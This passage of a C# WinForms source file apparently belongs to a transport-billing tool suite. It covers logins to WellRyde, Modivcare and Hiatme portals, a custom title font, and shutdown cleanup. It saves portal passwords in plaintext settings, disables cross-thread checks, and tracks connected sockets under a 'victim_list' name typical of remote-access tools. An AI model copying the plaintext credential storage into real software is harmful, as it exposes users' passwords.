using MaterialSkin;
using MaterialSkin.Controls;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Sockets;
using ListView = System.Windows.Forms.ListView;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Text;
using System.Web.UI.WebControls;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.IO;
using System.Reflection;
using SV;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar;
using System.Linq;
using Image = System.Drawing.Image;
using System.Globalization;
using Newtonsoft.Json;
using System.Windows.Forms.DataVisualization.Charting;
using System.Runtime.Remoting.Messaging;
using System.Web.UI;
using System.ComponentModel;
using static System.Net.Mime.MediaTypeNames;
using Application = System.Windows.Forms.Application;
using System.Threading;
using System.Windows.Forms.VisualStyles;
using System.Diagnostics;
using System.Media;
using Label = System.Windows.Forms.Label;
using System.Data.Entity.Core.Common.CommandTrees.ExpressionBuilder;
using System.Runtime.InteropServices;
using GMap.NET.MapProviders;
//using static System.Net.Mime.MediaTypeNames;

namespace Hiatme_Tool_Suite_v3
{
    public partial class Form1 : MaterialForm
    {

        private bool manuallogin = false;
        /// <summary>True after WellRyde portal bootstrap (GET main page) succeeds.</summary>
        private bool _wellRydePanelSessionActive;

        private WellRydePortalSession _wellRydeSession;

        readonly MaterialSkinManager materialSkinManager;
        public System.Windows.Forms.Timer billtimer;

        MCLoginHandler mcLoginHandler;
        HiatmeLoginHandler hiatmeLoginHandler;

        WRBillingTool wrBillingTool;
        MCTimeCorrection mcTimeCorrectionTool;
        TemplateBuilder tbuilder;
        FullScheduleBuilder fsbuilder;

        EmployeeStatManager empStatManager;
        /// <summary>Cancels an in-flight Production tab load when the user switches away or opens the tab again.</summary>
        CancellationTokenSource _employeeStatsLoadCts;
        /// <summary>Set when the main form is closing so timers, sockets, and async retries stop cleanly.</summary>
        private volatile bool _applicationExitRequested;
        private readonly object _infoAlSocketsLock = new object();
        private readonly HashSet<Socket> _infoAlActiveSockets = new HashSet<Socket>();
        ReportCard reportCard;
        /// <summary>Must be initialized before <see cref="Form1"/> ctor body uses it (partial-class field order is not guaranteed if declared later in this file).</summary>
        readonly Analyzer analyzer = new Analyzer();

        private readonly object _revampFontLock = new object();
        private PrivateFontCollection _revampFontCollection;
        private Font _revampFontLargeR;
        private Font _revampFontRest;
        private bool _revampFontLoadAttempted;
        /// <summary>Unmanaged copy of embedded font bytes; must stay allocated until <see cref="_revampFontCollection"/> is disposed (GDI+ requirement).</summary>
        private IntPtr _revampEmbeddedFontAlloc;

        private static int _startupMyPreciousPlayedFlag;

        public Form1()
        {
            // Login combo may raise SelectedIndexChanged during InitializeComponent; handlers must exist first.
            InitializeMCLoginHandler();
            InitializeHiatmeLoginHandler();
            InitializeComponent();;
            CheckForIllegalCrossThreadCalls = false;
            materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.EnforceBackcolorOnAllComponents = false;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            materialSkinManager.ColorScheme = new ColorScheme(Primary.Grey900, Primary.Grey800, Primary.BlueGrey500, Accent.Lime700, TextShade.WHITE);
            this.billinglistview.SizeChanged += new EventHandler(ListView_SizeChanged);
            tbuilder = new TemplateBuilder();
            tbuilder.UpdateLoadingScreen += loadinggifhandler_update;
            tbuilder.ShowLoadingScreen += loadinggifhandler_showscreen;
            tbuilder.HideLoadingScreen += loadinggifhandler_hidescreen;

            mcTimeCorrectionTool = new MCTimeCorrection(tccb);
            wrBillingTool = new WRBillingTool();

            //Connect_Setup();
            billtimer = new System.Windows.Forms.Timer();
            billtimer.Tick += billtimer_Tick;
            billtimer.Interval = 10000; //milisecunde

            analyzer.UpdateLoadingScreen += loadinggifhandler_update;
            analyzer.ShowLoadingScreen += loadinggifhandler_showscreen;
            analyzer.HideLoadingScreen += loadinggifhandler_hidescreen;

            portlbl.Text = portlbl.Text + port_no.ToString();
            // Default login provider is set in the designer before SelectedIndexChanged is wired; sync saved credentials once at show.
            Shown += Form1_Shown_SyncLoginPanelFromSettings;
            Load += Form1_OnLoad_DeferRevampPaintHook;
        }

        /// <summary>Never load fonts or take locks inside <see cref="PictureBox.Paint"/> — that can break first-frame layout for MaterialSkin.</summary>
        private void Form1_OnLoad_DeferRevampPaintHook(object sender, EventArgs e)
        {
            Load -= Form1_OnLoad_DeferRevampPaintHook;
            try
            {
                EnsureRevampLoginFontsLoaded();
                if (pictureBox1 != null)
                {
                    pictureBox1.Paint += PictureBox1_PaintRevampTitle;
                    pictureBox1.SizeChanged += PictureBox1_SizeChanged_RevampInvalidate;
                    pictureBox1.Invalidate();
                }
            }
            catch
            {
                // Revamp title is optional; the rest of the app must still run.
            }
        }

        private void Form1_Shown_SyncLoginPanelFromSettings(object sender, EventArgs e)
        {
            Shown -= Form1_Shown_SyncLoginPanelFromSettings;
            if (Interlocked.CompareExchange(ref _startupMyPreciousPlayedFlag, 1, 0) == 0)
                Program.TryPlayStartupMyPreciousOnce();
            loginCB_SelectedIndexChanged(loginCB, EventArgs.Empty);
            try
            {
                pictureBox1?.Invalidate();
            }
            catch
            {
                // ignore
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _applicationExitRequested = true;

            _employeeStatsLoadCts?.Cancel();
            _employeeStatsLoadCts?.Dispose();
            _employeeStatsLoadCts = null;

            StopRecurringUiTimers();
            StopClientListPollingTimer();
            ShutdownListenerAndTrackedSockets();
            CloseOtherOpenForms();

            try
            {
                if (pictureBox1 != null)
                {
                    pictureBox1.Paint -= PictureBox1_PaintRevampTitle;
                    pictureBox1.SizeChanged -= PictureBox1_SizeChanged_RevampInvalidate;
                }
            }
            catch
            {
                // ignore
            }

            DisposeRevampLoginFonts();

            try
            {
                materialSkinManager?.RemoveFormToManage(this);
            }
            catch
            {
                // MaterialSkin API may differ by version.
            }

            InvalidateWellRydePortalSession();

            try
            {
                mcLoginHandler?.Client?.Dispose();
            }
            catch
            {
                // ignore
            }

            // HttpClient.Dispose can block the UI thread for a long time if a request is stalled.
            var http = ServerHttpClient;
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    http?.Dispose();
                }
                catch
                {
                    // ignore
                }
            });

            base.OnFormClosing(e);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            // Ensure the OS process ends even if something (native handles, COM, HttpClient pools)
            // keeps the CLR alive briefly — otherwise Visual Studio stays attached until you Stop Debugging.
            Environment.Exit(0);
        }

        private void StopRecurringUiTimers()
        {
            try
            {
                billtimer?.Stop();
                if (billtimer != null)
                    billtimer.Tick -= billtimer_Tick;
                billtimer?.Dispose();
                timer1?.Stop();
                hidegiftimer?.Stop();
                timekiller?.Stop();
                clientcounttimer?.Stop();
            }
            catch
            {
                // ignore
            }
        }

        private void StopClientListPollingTimer()
        {
            try
            {
                _clientListTimer?.Stop();
                _clientListTimer?.Dispose();
            }
            catch
            {
                // ignore
            }
            _clientListTimer = null;
        }

        private void ShutdownListenerAndTrackedSockets()
        {
            Socket[] copy;
            lock (_infoAlSocketsLock)
            {
                copy = _infoAlActiveSockets.ToArray();
                _infoAlActiveSockets.Clear();
            }
            foreach (Socket s in copy)
                TryShutdownSocket(s);

            foreach (Victim v in victim_list.ToList())
                TryShutdownSocket(v?.soket);

            victim_list.Clear();

            TryShutdownSocket(oursocket);
            oursocket = null;
        }

        private static void TryShutdownSocket(Socket s)
        {
            if (s == null)
                return;
            try
            {
                if (s.Connected)
                    s.Shutdown(SocketShutdown.Both);
            }
            catch
            {
                // ignore
            }
            try
            {
                s.Close();
            }
            catch
            {
                // ignore
            }
            try
            {
                s.Dispose();
            }
            catch
            {
                // ignore
            }
        }

        private void CloseOtherOpenForms()
        {
            try
            {
                foreach (Form f in Application.OpenForms.Cast<Form>().ToList())
                {
                    if (!ReferenceEquals(f, this))
                    {
                        try
                        {
                            f.Close();
                        }
                        catch
                        {
                            // ignore
                        }
                    }
                }
            }
            catch
            {
                // ignore
            }
        }



        
























        private void PictureBox1_SizeChanged_RevampInvalidate(object sender, EventArgs e)
        {
            try
            {
                (sender as PictureBox)?.Invalidate();
            }
            catch
            {
                // ignore
            }
        }

        private void PictureBox1_PaintRevampTitle(object sender, PaintEventArgs e)
        {
            try
            {
                if (_revampFontLargeR == null || _revampFontRest == null)
                    return;

                var g = e.Graphics;
                var hintRestore = g.TextRenderingHint;

                const string r = "R";
                const string rest = "evamp";
                using (var format = (StringFormat)StringFormat.GenericTypographic.Clone())
                {
                    format.Alignment = StringAlignment.Near;
                    format.LineAlignment = StringAlignment.Near;

                    var szR = g.MeasureString(r, _revampFontLargeR, int.MaxValue, format);
                    var szRest = g.MeasureString(rest, _revampFontRest, int.MaxValue, format);
                    const float gapBetweenLetters = 6f;
                    const float padRight = 48f;
                    const float outlineHaloRight = 3f;
                    const float insetBottom = 0f;
                    const float minRescueInset = 8f;
                    float totalW = szR.Width + gapBetweenLetters + szRest.Width;
                    var pb = (PictureBox)sender;
                    float restYOffset = (szR.Height - szRest.Height) * 0.35f;
                    const float evampExtraDown = 20f;
                    float blockHeight = Math.Max(szR.Height, restYOffset + szRest.Height);
                    float rightEdge = pb.ClientSize.Width - padRight - outlineHaloRight;
                    float bottomEdge = pb.ClientSize.Height - insetBottom;
                    float x = rightEdge - totalW;
                    float y = bottomEdge - blockHeight;
                    if (x < minRescueInset)
                        x = minRescueInset;
                    if (y < minRescueInset)
                        y = minRescueInset;
                    float restY = y + restYOffset + evampExtraDown;
                    float relRestY = restY - y;
                    float blockH = Math.Max(szR.Height, relRestY + szRest.Height);

                    const float layerPad = 6f;
                    int bw = Math.Max(1, (int)Math.Ceiling(totalW + layerPad * 2f));
                    int bh = Math.Max(1, (int)Math.Ceiling(blockH + layerPad * 2f));

                    void DrawMirroredROn(Graphics gb, float rx, float ry, Brush brush)
                    {
                        var st = gb.Save();
                        try
                        {
                            gb.TranslateTransform(rx + szR.Width, ry);
                            gb.ScaleTransform(-1f, 1f);
                            gb.DrawString(r, _revampFontLargeR, brush, 0f, 0f, format);
                        }
                        finally
                        {
                            gb.Restore(st);
                        }
                    }

                    // 32bpp layer: per-pixel alpha blends over the image; crisp hint on layer only.
                    using (var layer = new Bitmap(bw, bh, PixelFormat.Format32bppArgb))
                    {
                        using (var gb = Graphics.FromImage(layer))
                        {
                            gb.Clear(Color.Transparent);
                            gb.CompositingMode = CompositingMode.SourceOver;
                            gb.CompositingQuality = CompositingQuality.HighQuality;
                            gb.SmoothingMode = SmoothingMode.AntiAlias;
                            gb.PixelOffsetMode = PixelOffsetMode.HighQuality;
                            gb.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;

                            float lx = layerPad;
                            float ly = layerPad;
                            float lRestY = layerPad + relRestY;
                            float lRestX = layerPad + szR.Width + gapBetweenLetters;

                            using (var outline = new SolidBrush(Color.FromArgb(252, 0, 0, 0)))
                            using (var fill = new SolidBrush(Color.FromArgb(232, 168, 12, 24)))
                            {
                                for (int dy = -2; dy <= 2; dy++)
                                {
                                    for (int dx = -2; dx <= 2; dx++)
                                    {
                                        if (dx == 0 && dy == 0)
                                            continue;
                                        DrawMirroredROn(gb, lx + dx, ly + dy, outline);
                                        gb.DrawString(rest, _revampFontRest, outline, lRestX + dx, lRestY + dy, format);
                                    }
                                }

                                DrawMirroredROn(gb, lx, ly, fill);
                                gb.DrawString(rest, _revampFontRest, fill, lRestX, lRestY, format);
                            }
                        }

                        float destX = x - layerPad;
                        float destY = y - layerPad;
                        var imgState = g.Save();
                        try
                        {
                            g.InterpolationMode = InterpolationMode.NearestNeighbor;
                            g.PixelOffsetMode = PixelOffsetMode.Half;
                            g.CompositingMode = CompositingMode.SourceOver;
                            g.CompositingQuality = CompositingQuality.HighQuality;
                            g.DrawImage(layer, destX, destY);
                        }
                        finally
                        {
                            g.Restore(imgState);
                        }
                    }

                    g.TextRenderingHint = hintRestore;
                }
            }
            catch
            {
                // ignore paint failures
            }
        }

        private void EnsureRevampLoginFontsLoaded()
        {
            lock (_revampFontLock)
            {
                if (_revampFontLoadAttempted)
                    return;
                _revampFontLoadAttempted = true;

                PrivateFontCollection trialCollection = null;
                IntPtr embeddedMem = IntPtr.Zero;
                try
                {
                    // Prefer font file beside the EXE (not embedded): keeps the main assembly smaller and avoids PE changes that correlate with Smart App Control blocks.
                    string baseDir = AppDomain.CurrentDomain.BaseDirectory ?? "";
                    string exeDir = Path.GetDirectoryName(Application.ExecutablePath) ?? baseDir;
                    string found = FindRevampDisplayFontFile(baseDir)
                        ?? FindRevampDisplayFontFile(exeDir);

                    if (found != null)
                    {
                        trialCollection = new PrivateFontCollection();
                        trialCollection.AddFontFile(found);
                        if (trialCollection.Families.Length == 0)
                        {
                            trialCollection.Dispose();
                            trialCollection = null;
                        }
                    }

                    if (trialCollection != null)
                    {
                        if (TryCreateRevampFontsFromPrivateCollection(trialCollection, ref embeddedMem))
                            return;
                    }

                    trialCollection?.Dispose();
                    trialCollection = null;

                    if (TryGetEmbeddedRevampFontCollection(out trialCollection, out embeddedMem))
                    {
                        if (TryCreateRevampFontsFromPrivateCollection(trialCollection, ref embeddedMem))
                            return;
                    }

                    trialCollection?.Dispose();
                    trialCollection = null;
                    if (embeddedMem != IntPtr.Zero)
                    {
                        Marshal.FreeCoTaskMem(embeddedMem);
                        embeddedMem = IntPtr.Zero;
                    }
                }
                catch
                {
                    trialCollection?.Dispose();
                    if (embeddedMem != IntPtr.Zero)
                    {
                        Marshal.FreeCoTaskMem(embeddedMem);
                        embeddedMem = IntPtr.Zero;
                    }
                }

                _revampFontLargeR = new Font("Impact", 262f, FontStyle.Bold, GraphicsUnit.Pixel);
                _revampFontRest = new Font("Impact", 118f, FontStyle.Bold, GraphicsUnit.Pixel);
            }
        }

        /// <summary>Loads YouMurderer from an embedded resource (see project Fonts\YouMurdererBB.otf). Caller frees <paramref name="allocatedFontMemory"/> on failure before taking ownership of the collection.</summary>
        private static bool TryGetEmbeddedRevampFontCollection(out PrivateFontCollection pfc, out IntPtr allocatedFontMemory)
        {
            pfc = null;
            allocatedFontMemory = IntPtr.Zero;
            var asm = typeof(Form1).Assembly;
            Stream stream = asm.GetManifestResourceStream("Hiatme_Tool_Suite_v3.Fonts.YouMurdererBB.otf");
            if (stream == null)
            {
                foreach (var rn in asm.GetManifestResourceNames())
                {
                    if (!rn.EndsWith(".otf", StringComparison.OrdinalIgnoreCase))
                        continue;
                    if (rn.IndexOf("murderer", StringComparison.OrdinalIgnoreCase) < 0
                        && rn.IndexOf("YouMurderer", StringComparison.OrdinalIgnoreCase) < 0)
                        continue;
                    stream = asm.GetManifestResourceStream(rn);
                    if (stream != null)
                        break;
                }
            }

            if (stream == null)
                return false;

            byte[] buf;
            using (var ms = new MemoryStream())
            using (stream)
            {
                stream.CopyTo(ms);
                buf = ms.ToArray();
            }

            if (buf.Length == 0)
                return false;

            IntPtr ptr = Marshal.AllocCoTaskMem(buf.Length);
            try
            {
                Marshal.Copy(buf, 0, ptr, buf.Length);
                var col = new PrivateFontCollection();
                col.AddMemoryFont(ptr, buf.Length);
                if (col.Families.Length == 0)
                {
                    col.Dispose();
                    Marshal.FreeCoTaskMem(ptr);
                    return false;
                }

                allocatedFontMemory = ptr;
                pfc = col;
                return true;
            }
            catch
            {
                Marshal.FreeCoTaskMem(ptr);
                pfc = null;
                allocatedFontMemory = IntPtr.Zero;
                return false;
            }
        }

        /// <summary>Transfers <paramref name="trialCollection"/> into fields; on success takes ownership of <paramref name="embeddedFontMemory"/> (must not free caller).</summary>
        private bool TryCreateRevampFontsFromPrivateCollection(PrivateFontCollection trialCollection, ref IntPtr embeddedFontMemory)
        {
            Font large = null;
            Font small = null;
            try
            {
                var registeredName = trialCollection.Families[0].Name;
                var fam = new FontFamily(registeredName, trialCollection);
                large = new Font(fam, 320f, FontStyle.Regular, GraphicsUnit.Pixel);
                small = new Font(fam, 140f, FontStyle.Regular, GraphicsUnit.Pixel);
                _revampFontCollection = trialCollection;
                _revampFontLargeR = large;
                _revampFontRest = small;
                large = null;
                small = null;
                if (embeddedFontMemory != IntPtr.Zero)
                {
                    _revampEmbeddedFontAlloc = embeddedFontMemory;
                    embeddedFontMemory = IntPtr.Zero;
                }

                return true;
            }
            catch
            {
                large?.Dispose();
                small?.Dispose();
                return false;
            }
        }

        /// <summary>Locate YouMurderer (or any dropped) display font next to the EXE — FontSpace downloads often use other file names.</summary>
        private static string FindRevampDisplayFontFile(string root)
        {
            if (string.IsNullOrEmpty(root))
                return null;

            string[] fixedNames =
            {
                Path.Combine(root, "Fonts", "YouMurdererBB.otf"),
                Path.Combine(root, "Fonts", "youmurdererbb.otf"),
                Path.Combine(root, "Fonts", "YouMurderer BB.otf"),
                Path.Combine(root, "YouMurdererBB.otf"),
                Path.Combine(root, "youmurdererbb_bb_otf15980.otf"),
            };

            foreach (var p in fixedNames)
            {
                if (File.Exists(p))
                    return p;
            }

            try
            {
                string fontsDir = Path.Combine(root, "Fonts");
                if (!Directory.Exists(fontsDir))
                    return null;

                foreach (var ext in new[] { "*.otf", "*.ttf" })
                {
                    foreach (var path in Directory.GetFiles(fontsDir, ext, SearchOption.TopDirectoryOnly))
                    {
                        var n = Path.GetFileName(path) ?? "";
                        if (n.IndexOf("murderer", StringComparison.OrdinalIgnoreCase) >= 0
                            || n.IndexOf("youmurderer", StringComparison.OrdinalIgnoreCase) >= 0)
                            return path;
                    }
                }

                foreach (var ext in new[] { "*.otf", "*.ttf" })
                {
                    var any = Directory.GetFiles(fontsDir, ext, SearchOption.TopDirectoryOnly);
                    if (any.Length == 1)
                        return any[0];
                }
            }
            catch
            {
                // ignore IO errors
            }

            return null;
        }

        private void DisposeRevampLoginFonts()
        {
            lock (_revampFontLock)
            {
                try
                {
                    _revampFontLargeR?.Dispose();
                    _revampFontRest?.Dispose();
                    _revampFontCollection?.Dispose();
                }
                catch
                {
                    // ignore
                }

                _revampFontLargeR = null;
                _revampFontRest = null;
                _revampFontCollection = null;

                if (_revampEmbeddedFontAlloc != IntPtr.Zero)
                {
                    try
                    {
                        Marshal.FreeCoTaskMem(_revampEmbeddedFontAlloc);
                    }
                    catch
                    {
                        // ignore
                    }

                    _revampEmbeddedFontAlloc = IntPtr.Zero;
                }
            }
        }

        /// <summary>Login handlers can run during InitializeComponent before <see cref="lightImageList"/> images are loaded from the resx.</summary>
        private void SetWrPbLightImage(int imageIndex)
        {
            if (lightImageList?.Images != null && imageIndex >= 0 && imageIndex < lightImageList.Images.Count)
                wrPBLight.Image = lightImageList.Images[imageIndex];
        }

        //LOGIN
        private void loginCB_SelectedIndexChanged(object sender, EventArgs e)
        {
            loginCodeTB.Enabled = false;
            switch (this.loginCB.GetItemText(this.loginCB.SelectedItem))
            {
                case "Wellryde":
                    LoadWRCredentials();
                    if (_wellRydePanelSessionActive) { DisableWRLogin(); }
                    else { EnableWRLogin(); }
                    break;
                case "Modivcare":
                    LoadMCCredentials();
                    if (mcLoginHandler?.Connected == true) { DisableMCLogin(); }
                    else { EnableMCLogin(); }
                    break;
                case "Hiatme":
                    LoadHiatmeCredentials();
                    if (hiatmeLoginHandler?.Connected == true) { DisableHiatmeLogin(); }
                    else { EnableHiatmeLogin(); }
                    break;
            }
        }
        private async void loginBtn_Click(object sender, EventArgs e)
        {
            manuallogin = true;
            ShowLoadingGif();
            switch (loginCB.SelectedIndex)
            {
                case 0:
                    if (_wellRydePanelSessionActive)
                    {
                        await SetLoadingGifLabel("WellRyde: signing out…");
                        InvalidateWellRydePortalSession();
                        EnableWRLogin();
                        hidegiftimer.Start();
                    }
                    else
                    {
                        string companycode = (loginCodeTB.Text ?? "").Trim();
                        string username = (loginUserTB.Text ?? "").Trim();
                        string password = loginPassTB.Text ?? "";
                        if (string.IsNullOrEmpty(companycode) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                        {
                            hidegiftimer.Start();
                            MessageBox.Show("Enter company code, username, and password.");
                            return;
                        }
                        string loginErr = await TryWellRydePortalHttpLoginAsync(companycode, username, password);
                        if (loginErr != null)
                        {
                            hidegiftimer.Start();
                            MessageBox.Show(loginErr);
                            return;
                        }
                        _wellRydePanelSessionActive = true;
                        SaveWRCredentials(companycode, username, password);
                        DisableWRLogin();
                        hidegiftimer.Start();
                    }
                    break;
                case 1:
                    if (mcLoginHandler.Connected == true)
                    {
                        await SetLoadingGifLabel("Modivcare: signing out…");
                        await mcLoginHandler.Logout();
                        hidegiftimer.Start();
                    }
                    else
                    {
                        await SetLoadingGifLabel("Logging into Modivcare");
                        await MCLogin();
                    }
                    break;
                case 2:
                    hidegiftimer.Start();
                    break;
            }
            if (manuallogin)
            {
                manuallogin = false;
            }

        }
        private void LoadWRCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.wrUserName))
            {
                loginCodeTB.Text = Properties.Settings.Default.wrCompanyCode ?? "";
                loginUserTB.Text = Properties.Settings.Default.wrUserName;
                loginPassTB.Text = Properties.Settings.Default.wrUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }

        private void SaveWRCredentials(string code, string user, string pass)
        {
            try
            {
                if (loginSwitch.Checked == false)
                {
                    Properties.Settings.Default.wrCompanyCode = "";
                    Properties.Settings.Default.wrUserName = "";
                    Properties.Settings.Default.wrUserPass = "";
                    Properties.Settings.Default.Save();
                }
                else
                {
                    Properties.Settings.Default.wrCompanyCode = code ?? "";
                    Properties.Settings.Default.wrUserName = user ?? "";
                    Properties.Settings.Default.wrUserPass = pass ?? "";
                    Properties.Settings.Default.Save();
                }
            }
            catch
            {
                Console.WriteLine("There was a problem saving WellRyde credentials");
            }
        }

        private void EnableWRLogin()
        {
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = true;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 0;
            loginCB.Focus();
        }

        private void DisableWRLogin()
        {
            SetWrPbLightImage(1);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 0;
        }

        /// <summary>Bootstrap + Spring login + /portal/nu. On failure abandons <see cref="_wellRydeSession"/>.</summary>
        /// <returns><c>null</c> on success; otherwise an error message for the user.</returns>
        private async Task<string> TryWellRydePortalHttpLoginAsync(string companycode, string username, string password)
        {
            await SetLoadingGifLabel("Checking connections");
            _wellRydeSession?.Dispose();
            _wellRydeSession = new WellRydePortalSession();
            WellRydePortalBootstrapResult wrBoot;
            try
            {
                wrBoot = await _wellRydeSession.BootstrapMainPageAsync();
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return "WellRyde portal request failed: " + ex.Message;
            }
            if (!wrBoot.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                var prefix = wrBoot.StatusCode.HasValue
                    ? "HTTP " + (int)wrBoot.StatusCode.Value + " — "
                    : "";
                return prefix + (wrBoot.ErrorMessage ?? "Could not load portal.");
            }
            await SetLoadingGifLabel("Signing in to WellRyde");
            WellRydePortalLoginResult wrLogin;
            try
            {
                wrLogin = await _wellRydeSession.LoginSpringSecurityAsync(companycode, username, password);
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return "WellRyde login failed: " + ex.Message;
            }
            if (!wrLogin.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return wrLogin.ErrorMessage ?? "WellRyde login was not accepted.";
            }
            await SetLoadingGifLabel("Loading WellRyde portal…");
            WellRydePortalNuResult wrNu;
            try
            {
                wrNu = await _wellRydeSession.GetPortalNuAsync();
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return "WellRyde /portal/nu failed: " + ex.Message;
            }
            if (!wrNu.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                var nuPrefix = wrNu.StatusCode.HasValue
                    ? "HTTP " + (int)wrNu.StatusCode.Value + " — "
                    : "";
                return nuPrefix + (wrNu.ErrorMessage ?? "Could not load /portal/nu.");
            }
            return null;
        }

        private void InvalidateWellRydePortalSession()
        {
            _wellRydePanelSessionActive = false;
            _wellRydeSession?.Dispose();
            _wellRydeSession = null;
        }

        private static bool WellRydeFilterDataLooksLikeAuthOrSessionFailure(WellRydePortalFilterDataResult r)
        {
            if (r == null || r.IsSuccess)
                return false;
            if (r.StatusCode == HttpStatusCode.Unauthorized || r.StatusCode == HttpStatusCode.Forbidden)
                return true;
            var msg = (r.ErrorMessage ?? "").ToLowerInvariant();
            return msg.Contains("csrf") || msg.Contains("login") || msg.Contains("session") || msg.Contains("sign in");
        }

        /// <summary>Ensures portal session, loads trips, and on auth-like filterdata failure invalidates once and retries so the caller still completes the same action.</summary>
        private async Task<(WellRydePortalFilterDataResult reloadResult, int portalTotalRecords)> ReloadBillingTripsFromPortalWithAuthRetryAsync()
        {
            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                return (WellRydePortalFilterDataResult.Fail(null, "WellRyde portal session is not available."), 0);

            var first = await wrBillingTool.ReloadTripsFromPortalAsync(_wellRydeSession, rjDatePicker1.Value);
            if (first.result.IsSuccess || !WellRydeFilterDataLooksLikeAuthOrSessionFailure(first.result))
                return first;

            InvalidateWellRydePortalSession();
            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                return (WellRydePortalFilterDataResult.Fail(null, "Could not re-authenticate to WellRyde."), 0);

            return await wrBillingTool.ReloadTripsFromPortalAsync(_wellRydeSession, rjDatePicker1.Value);
        }

        /// <summary>For billing and tools: probe an existing session with /portal/nu; if stale, re-login then return. Uses saved or on-screen WellRyde credentials.</summary>
        private async Task<bool> EnsureWellRydePortalSessionForBillingAsync()
        {
            if (_wellRydePanelSessionActive && _wellRydeSession != null)
            {
                await SetLoadingGifLabel("Checking connections");
                bool nuOk = false;
                try
                {
                    var nu = await _wellRydeSession.GetPortalNuAsync();
                    nuOk = nu.IsSuccess;
                }
                catch
                {
                    nuOk = false;
                }
                if (nuOk)
                {
                    await SetLoadingGifLabel("WellRyde: already signed in");
                    return true;
                }
                InvalidateWellRydePortalSession();
            }

            string companycode;
            string username;
            string password;
            if (loginCB.SelectedIndex == 0)
            {
                companycode = (loginCodeTB.Text ?? "").Trim();
                username = (loginUserTB.Text ?? "").Trim();
                password = loginPassTB.Text ?? "";
            }
            else
            {
                companycode = (Properties.Settings.Default.wrCompanyCode ?? "").Trim();
                username = (Properties.Settings.Default.wrUserName ?? "").Trim();
                password = Properties.Settings.Default.wrUserPass ?? "";
            }
            if (string.IsNullOrEmpty(companycode) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                await SetLoadingGifLabel("Checking connections");
                MessageBox.Show("Wellryde is not signed in. Use the Wellryde tab to sign in, or save credentials with Remember credentials.");
                return false;
            }

            string err = await TryWellRydePortalHttpLoginAsync(companycode, username, password);
            if (err != null)
            {
                MessageBox.Show(err);
                return false;
            }
            _wellRydePanelSessionActive = true;
            return true;
        }

        private void RevealPass_Click(object sender, EventArgs e)
        {
            if (loginPassTB.Password == true)
            {
                loginPassTB.Password = false;
            }
            else
            {
                loginPassTB.Password = true;
            }
           
        }
        //Hiatme Login Functions, Handlers etc
        public void InitializeHiatmeLoginHandler()
        {
            hiatmeLoginHandler = new HiatmeLoginHandler();
        }
        private void LoadHiatmeCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.hiatmeUserName))
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = Properties.Settings.Default.hiatmeUserName;
                loginPassTB.Text = Properties.Settings.Default.hiatmeUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }
        private void EnableHiatmeLogin()
        {
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 2;
            loginCB.Focus();
        }
        private void DisableHiatmeLogin()
        {
            SetWrPbLightImage(1);
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 2;
        }

        //Modivcare Login Functions, Handlers etc
        public void InitializeMCLoginHandler()
        {
            mcLoginHandler = new MCLoginHandler();
            mcLoginHandler.PropertyChanged += UpdateMCConnectionStatus;
        }
        private async Task MCLogin()
        {
            if (manuallogin)
            {
                ShowLoadingGif();
            }
            loginCB.SelectedIndex = 1; loginCB.Focus();
            string username = loginUserTB.Text ?? "";
            string password = loginPassTB.Text ?? "";
            if (username == "" || password == "")
            {
                hidegiftimer.Start();
                MessageBox.Show("Login information not entered.");
                return;
            }

            await PerformModivcareLoginWithCredentialsAsync(username, password, saveOnSuccess: true);

            if (manuallogin)
            {
                hidegiftimer.Start();
            }
        }

        /// <summary>POST Modivcare login; optional save when Remember credentials applies.</summary>
        private async Task PerformModivcareLoginWithCredentialsAsync(string username, string password, bool saveOnSuccess)
        {
            await mcLoginHandler.Login(username, password);
            if (mcLoginHandler.Connected && saveOnSuccess)
